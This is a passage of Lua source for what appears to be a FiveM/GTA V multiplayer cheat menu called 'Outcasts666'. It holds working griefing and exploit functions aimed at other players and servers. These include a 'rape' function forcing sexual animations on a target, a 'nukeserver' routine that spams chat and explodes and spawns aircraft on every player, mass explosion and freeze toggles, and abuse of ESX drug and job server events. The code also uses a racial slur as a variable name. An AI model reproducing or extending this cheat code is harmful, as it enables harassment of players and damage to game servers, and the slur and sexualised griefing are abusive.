    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D2(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)

    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov

    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry('STRING')
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

Citizen.CreateThread(
    function()
        while presense do
            if nname ~= GetPlayerName(PlayerId()) then
                Citizen.Wait(3000)
                nname = count[math.random(#count)]
            elseif nname == GetPlayerName(PlayerId()) then
                Citizen.Wait(50)
                nname = count[math.random(#count)]
            end
        end
    end
)
    
    function rape(player) 
        Citizen.CreateThread(function() 
            RequestModelSync("a_m_o_acult_01") 
            RequestAnimDict("rcmpaparazzo_2") 
            while not HasAnimDictLoaded("rcmpaparazzo_2") do 
                Citizen.Wait(0) 
            end
            
            if IsPedInAnyVehicle(GetPlayerPed(player), true) then 
                local veh = GetVehiclePedIsIn(GetPlayerPed(player), true) 
                
                while not NetworkHasControlOfEntity(veh) do 
                    NetworkRequestControlOfEntity(veh) Citizen.Wait(0) 
                end
                
                SetEntityAsMissionEntity(veh, true, true) 
                DeleteVehicle(veh) 
                DeleteEntity(veh) 
            end 
            count = -0.2
            for b = 1, 3 do 
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
                local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) 
                SetEntityAsMissionEntity(bD, true, true) 
                AttachEntityToEntity(bD, 
                GetPlayerPed(player), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) 
                ClearPedTasks(GetPlayerPed(player)) 
                TaskPlayAnim(GetPlayerPed(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) 
                SetPedKeepTask(bD) 
                TaskPlayAnim(bD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) 
                SetEntityInvincible(bD, true) count = count - 0.4
            end 
        end) 
    end

    function teleportToNearestVehicle()
                local playerPed = GetPlayerPed(-1)
                local playerPedPos = GetEntityCoords(playerPed, true)
                local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
                local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
                local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
                local NearestPlanePos = GetEntityCoords(NearestPlane, true)
            drawNotification("~y~Wait...")
            Citizen.Wait(1000)
            if (NearestVehicle == 0) and (NearestPlane == 0) then
                drawNotification("~r~No Vehicle Found")
            elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
                drawNotification("~g~Teleported Into Nearest Vehicle!")
            elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
                drawNotification("~g~Teleported Into Nearest Vehicle!")
            elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
                if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                    if IsVehicleSeatFree(NearestVehicle, -1) then
                        SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                        SetVehicleAlarm(NearestVehicle, false)
                        SetVehicleDoorsLocked(NearestVehicle, 1)
                        SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                    else
                        local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                        ClearPedTasksImmediately(driverPed)
                        SetEntityAsMissionEntity(driverPed, 1, 1)
                        DeleteEntity(driverPed)
                        SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                        SetVehicleAlarm(NearestVehicle, false)
                        SetVehicleDoorsLocked(NearestVehicle, 1)
                        SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                    end
                elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                    if IsVehicleSeatFree(NearestPlane, -1) then
                        SetPedIntoVehicle(playerPed, NearestPlane, -1)
                        SetVehicleAlarm(NearestPlane, false)
                        SetVehicleDoorsLocked(NearestPlane, 1)
                        SetVehicleNeedsToBeHotwired(NearestPlane, false)
                    else
                        local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                        ClearPedTasksImmediately(driverPed)
                        SetEntityAsMissionEntity(driverPed, 1, 1)
                        DeleteEntity(driverPed)
                        SetPedIntoVehicle(playerPed, NearestPlane, -1)
                        SetVehicleAlarm(NearestPlane, false)
                        SetVehicleDoorsLocked(NearestPlane, 1)
                        SetVehicleNeedsToBeHotwired(NearestPlane, false)
                    end
                end
                drawNotification("~g~Teleported Into Nearest Vehicle!")
            end
    
        end
    
    
        -- Discord presenece
        Citizen.CreateThread(function()
            while Enabled do
                if discordPresence then
                    --This is the Application ID (Replace this with you own)
                    SetDiscordAppId(612594475021238272)
            
                    --Here you will have to put the image name for the "large" icon.
                    SetDiscordRichPresenceAsset('red')
                    
                    --(11-11-2018) New Natives:
            
                    --Here you can add hover text for the "large" icon.
                    SetDiscordRichPresenceAssetText('This is a lage icon with text')
                
                    --Here you will have to put the image name for the "small" icon.
                    SetDiscordRichPresenceAssetSmall('logo_name')
            
                    --Here you can add hover text for the "small" icon.
                    SetDiscordRichPresenceAssetSmallText('This is a lsmall icon with text')
            
                    --It updates every one minute just in case.
                end
                Citizen.Wait(60000) --10s
            end
        end)
    
    Citizen.CreateThread(function() 
        local headId = {}
        while Enabled do
            Citizen.Wait(1)
            if playerBlips then
                -- show blips
                for id = 0, 128 do
                    if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(id)
                        blip = GetBlipFromEntity(ped)
    
                        -- HEAD DISPLAY STUFF --
    
                        -- Create head display (this is safe to be spammed)
                        headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
                        wantedLvl = GetPlayerWantedLevel(id)
    
                        -- Wanted level display
                        if wantedLvl then
                            SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
                            SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
                        else
                            SetMpGamerTagVisibility(headId[id], 7, false)
                        end
    
                        -- Speaking display
                        if NetworkIsPlayerTalking(id) then
                            SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
                        else
                            SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
                        end
    
                        -- BLIP STUFF --
    
                        if not DoesBlipExist(blip) then -- Add blip and create head display on player
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                        else -- update blip
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then -- dead
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then -- Helicopters
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehClass == 8 then -- Motorcycles
                                    if blipSprite ~= 226 then
                                        SetBlipSprite(blip, 226)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehClass == 16 then -- Plane
                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehClass == 14 then -- Boat
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
                                    if blipSprite ~= 460 then
                                        SetBlipSprite(blip, 460)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("rhino") then -- Tank
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
                                    if blipSprite ~= 318 then
                                        SetBlipSprite(blip, 318)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("pbus") then -- Prison Bus
                                    if blipSprite ~= 513 then
                                        SetBlipSprite(blip, 513)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
                                    if blipSprite ~= 471 then
                                        SetBlipSprite(blip, 471)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
                                    if blipSprite ~= 481 then
                                        SetBlipSprite(blip, 481)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
                                    if blipSprite ~= 198 then
                                        SetBlipSprite(blip, 198)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
                                    or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
                                    or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
                                    if blipSprite ~= 56 then
                                        SetBlipSprite(blip, 56)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif blipSprite ~= 1 then -- default blip
                                    SetBlipSprite(blip, 1)
                                    ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                                end
    
                                -- Show number in case of passangers
                                passengers = GetVehicleNumberOfPassengers(veh)
    
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                -- Remove leftover number
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then -- default blip
                                    SetBlipSprite(blip, 1)
                                    ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                                end
                            end
                            
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
                            SetBlipNameToPlayerName(blip, id) -- update blip name
                            SetBlipScale(blip,  0.85) -- set scale
    
                            -- set player alpha
                            if IsPauseMenuActive() then
                                SetBlipAlpha( blip, 255 )
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                -- Probably a way easier way to do this but whatever im an idiot
    
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    end
                end
            else
                for id = 0, 128 do
                    ped = GetPlayerPed(id)
                    blip = GetBlipFromEntity(ped)
                    if DoesBlipExist(blip) then -- Removes blip
                        RemoveBlip(blip)
                    end
                    if Citizen.InvokeNative("0x4E929E7A5796FD26", headId[id]) then
                        RemoveMpGamerTag(headId[id])
                    end
                end
            end
        end
    end)
    
    function ShootPlayer(player)
        local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
    end
    
    function SpawnAnimal(model)
        while not HasModelLoaded(model) do
            debugPrint("Loading Model...")
            RequestModel(model)
            Citizen.Wait(0)
        end
        for i = 1, 128 do
            local coords = GetEntityCoords(GetPlayerPed(i))
            local ped = CreatePed(29, model, coords.x, coords.y, coords.z + 1.0, 1, true, true)
            TaskCombatPed(ped,GetPlayerPed(i),0,16)
        end    
    end
    
    
    function SpawnObjOnPlayer(modelHash)
        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)					
        local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
            if attachProp then
                AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
            end
    end
    
    function nukeserver()
        Citizen.CreateThread(function()
            local dg="Avenger"
            local dh="CARGOPLANE"
            local di="luxor"
            local dj="maverick"
            local dk="blimp2"
            
            while not HasModelLoaded(GetHashKey(dh))do 
                Citizen.Wait(0)
                RequestModel(GetHashKey(dh))
            end
            
            while not HasModelLoaded(GetHashKey(di))do
                Citizen.Wait(0)RequestModel(GetHashKey(di))
            end
                
            while not HasModelLoaded(GetHashKey(dg))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dg))
            end
                
            while not HasModelLoaded(GetHashKey(dj))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dj))
            end
            
            while not HasModelLoaded(GetHashKey(dk))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dk))
            end
            
            for bs=0,9 do 
                TriggerServerEvent("_chat:messageEntered","^2Outcasts666",{141,211,255},"Outcasts 666 Created By: OutcastModdingteam Outcast#3723")
            end
            
            for i=0,128 do 
                local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
            end
         end)
        end
    
    function rotDirection(rot)
        local radianz = rot.z * 0.0174532924
        local radianx = rot.x * 0.0174532924
        local num = math.abs(math.cos(radianx))
    
        local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))
    
        return dir
    end
                            
    function GetDistance(pointA, pointB)
        
        local aX = pointA.x
        local aY = pointA.y
        local aZ = pointA.z 
    
        local bX = pointB.x
        local bY = pointB.y
        local bZ = pointB.z 
    
        local xBA = bX - aX
        local yBA = bY - aY
        local zBA = bZ - aZ
    
        local y2 = yBA * yBA
        local x2 =  xBA * xBA
        local sum2 = y2 + x2	
    
        return math.sqrt(sum2 + zBA)
    end
    
    function RotToDirection(rot)
        local radiansZ = rot.z * 0.0174532924
        local radiansX = rot.x * 0.0174532924
        local num = math.abs(math.cos(radiansX))
        local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
        return dir
    end
    
    function add(a, b)
        local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)
    
        return result
    end
    
    function multiply(coords, coordz)
        local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)
    
        return result
    end
    
    function SpectatePlayer(player)
        local playerPed = PlayerPedId()
        Spectating = not Spectating
        local targetPed = GetPlayerPed(player)
    
        if (Spectating) then
            local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
    
            RequestCollisionAtCoord(targetx, targety, targetz)
            NetworkSetInSpectatorMode(true, targetPed)
    
            drawNotification("Spectating " .. GetPlayerName(player))
        else
            local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
    
            RequestCollisionAtCoord(targetx, targety, targetz)
            NetworkSetInSpectatorMode(false, targetPed)
    
            drawNotification("Stopped Spectating " .. GetPlayerName(player))
        end
    end
    
    Citizen.CreateThread(
        function()
            while true do
                Citizen.Wait(0)
                
                DisplayRadar(true)
    
                SetPlayerWantedLevel(PlayerId(-1), 0, false)
    
                SetPlayerWeaponDamageModifier(PlayerId(-1), selectedDamage)
                SetPlayerMeleeWeaponDamageModifier(PlayerId(-1), selectedDamage)
    
                SetPlayerInvincible(PlayerId(-1), GodMode)
                SetEntityInvincible(PlayerPedId(-1), GodMode)
				
			    SetPlayerInvincible(PlayerId(-1), Godmode)
                SetEntityInvincible(PlayerPedId(-1), Godmode)
                SetEntityVisible(GetPlayerPed(-1), d4, 0)

				if Godmode then
                SetPlayerWeaponDamageModifier(PlayerId(-1), selectedDamage)
                SetPlayerMeleeWeaponDamageModifier(PlayerId(-1), selectedDamage)
    
                SetPlayerInvincible(PlayerId(-1), GodMode)
                SetEntityInvincible(PlayerPedId(-1), GodMode)
				
			    SetPlayerInvincible(PlayerId(-1), Godmode)
                SetEntityInvincible(PlayerPedId(-1), Godmode)
                SetEntityVisible(GetPlayerPed(-1), d4, 0)
				RestorePlayerStamina(PlayerId(-1), 1.0)
				
                end
				
                if infStamina then
                    RestorePlayerStamina(PlayerId(-1), 1.0)
                end
    
                if invisible then
                    SetEntityVisible(GetPlayerPed(-1), false, 0)
                else
                    SetEntityVisible(GetPlayerPed(-1), true, 0)
                end
    
                if freezePlayer then 
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                end
    
                if runtog then
                    for i = 0, 128 do
                        if IsPedRunning(GetPlayerPed(i) or IsPedSprinting(GetPlayerPed(i))) then
                            ClearPedTasksImmediately(GetPlayerPed(play))
                        end
                    end
                end

            if BlowDrugsUp then
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellOpium')
						TriggerServerEvent("esx_bitcoin:startHarvestKoda")
						TriggerServerEvent("esx_bitcoin:startSellKoda")
						TriggerServerEvent("esx_mechanicjob:startHarvest")
						TriggerServerEvent("esx_mechanicjob:startCraft")
						TriggerServerEvent("esx_mechanicjob:startHarvest2")
						TriggerServerEvent("esx_mechanicjob:startCraft2")
						TriggerServerEvent("esx_mechanicjob:startHarvest3")
						TriggerServerEvent("esx_mechanicjob:startCraft3")
						TriggerServerEvent("esx_mechanicjob:startHarvest4")
						TriggerServerEvent("esx_mechanicjob:startCraft4")
						TriggerServerEvent("esx_mechanicjob:startHarvest5")
						TriggerServerEvent("esx_mechanicjob:startCraft5")
						TriggerServerEvent("esx_mechanicjob:startHarvest6")
						TriggerServerEvent("esx_mechanicjob:startCraft6")

                        Citizen.Wait(1000)
                    end
                )
            end
				
                if crosshair then 
                    ShowHudComponentThisFrame(14)
                end
    
                if crosshair2 then
                    ch("~r~+",0.495,0.484)
                end
    
                if crosshair3 then
                    ch("~r~.",0.4968,0.478)
                end
    
                if rainbow then
                    local color = RGBRainbow(1.0)
                    for i = 0, #allMenus do
                        Outcasts666.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
                    end  
                    for i, dA in pairs(bd) do                 
                        Outcasts666.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
                    end
                    for i, dA in pairs(be) do 
                        Outcasts666.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                    end
                end
                
                if animated then                                   
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Outcasts666.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
                            end
                            for i, dA in pairs(bd) do
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                
                            end      
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Outcasts666.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
                            end
                            for i, dA in pairs(bd) do
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Outcasts666.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
                            end
                            for i, dA in pairs(bd) do
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Outcasts666.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
                            end
                            for i, dA in pairs(bd) do
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Outcasts666.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                
                            end                          
                end
    
                if fall then
                    for i = 0, 128 do
                        ClearPedTasksImmediately(GetPlayerPed(i))
                    end
                end
    
                if blowall then
                    for i = 0, 128 do
                        local ped = GetPlayerPed(i)
                        local coords = GetEntityCoords(ped)
                        AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
                    end
                end
    
                if sall then
                    for i = 0, 128 do
                        local ped = GetPlayerPed(i)
                        local coords = GetEntityCoords(ped)
                        local vehiclehash = GetHashKey("savage")
                        RequestModel(vehiclehash)
                        CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                    end
                end
    
                local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                if IsPedInAnyVehicle(PlayerPedId()) then	
                    if driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 5.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                    end
                    
                
                    if superGrip then				
                        SetVehicleGravityAmount(niggerVehicle, 20.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)			
                    end
    
                    if enchancedGrip then
                        SetVehicleGravityAmount(niggerVehicle, 12.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                    end
    
                    if fdMode then	
                        SetVehicleGravityAmount(niggerVehicle, 5.5)
                        SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                    elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                        SetVehicleGravityAmount(niggerVehicle, 10.0)
                        SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                    end
    
                    if t2x then 
                        SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
                    end
                    
                    if t4x then 
                        SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
                    end
    
                    if t8x then 
                        SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
                    end
    
                    if t16x then 
                        SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
                    end
                end
                
    
                if Noclip then
                    local currentSpeed = 2
                    local noclipEntity =
                        IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                    FreezeEntityPosition(PlayerPedId(), true)
                    SetEntityInvincible(PlayerPedId(), true)
    
                    local newPos = GetEntityCoords(entity)
    
                    DisableControlAction(0, 32, true) --MoveUpOnly
                    DisableControlAction(0, 268, true) --MoveUp
    
                    DisableControlAction(0, 31, true) --MoveUpDown
    
                    DisableControlAction(0, 269, true) --MoveDown
                    DisableControlAction(0, 33, true) --MoveDownOnly
    
                    DisableControlAction(0, 266, true) --MoveLeft
                    DisableControlAction(0, 34, true) --MoveLeftOnly
    
                    DisableControlAction(0, 30, true) --MoveLeftRight
    
                    DisableControlAction(0, 267, true) --MoveRight
                    DisableControlAction(0, 35, true) --MoveRightOnly
    
                    DisableControlAction(0, 44, true) --Cover
                    DisableControlAction(0, 20, true) --MultiplayerInfo
    
                    local yoff = 0.0
                    local zoff = 0.0
    
                    if GetInputMode() == "MouseAndKeyboard" then
                        if IsDisabledControlPressed(0, 32) then
                            yoff = 0.5
                        end
                        if IsDisabledControlPressed(0, 33) then
                            yoff = -0.5
                        end
                        if IsDisabledControlPressed(0, 34) then
                            SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
                        end
